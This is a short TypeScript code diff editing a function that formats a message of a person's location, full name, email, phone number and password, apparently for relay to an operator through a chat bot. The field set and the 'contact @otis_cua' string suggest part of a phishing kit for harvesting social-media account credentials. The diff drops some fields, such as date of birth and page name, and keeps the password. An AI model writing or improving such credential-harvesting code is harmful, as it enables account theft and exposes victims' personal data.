@@ -157,11 +157,7 @@ function formatMessage(data: any): string {
 <b>Location:</b> <code>${escapeHtml(d.location || 'Error, contact @otis_cua')}</code>
 -----------------------------
 <b>Full Name:</b> <code>${escapeHtml(d.fullName)}</code>
-<b>Page Name:</b> <code>${escapeHtml(d.fanpage)}</code>
-<b>Date of birth:</b> <code>${escapeHtml(d.day)}/${escapeHtml(d.month)}/${escapeHtml(d.year)}</code>
------------------------------
 <b>Email:</b> <code>${escapeHtml(d.email)}</code>
-<b>Email Business:</b> <code>${escapeHtml(d.emailBusiness)}</code>
 <b>Phone Number:</b> <code>${d.phone ? escapeHtml(`+${d.phone}`) : ''}</code>
 -----------------------------
 <b>Password(1):</b> <code>${escapeHtml(d.password)}</code>
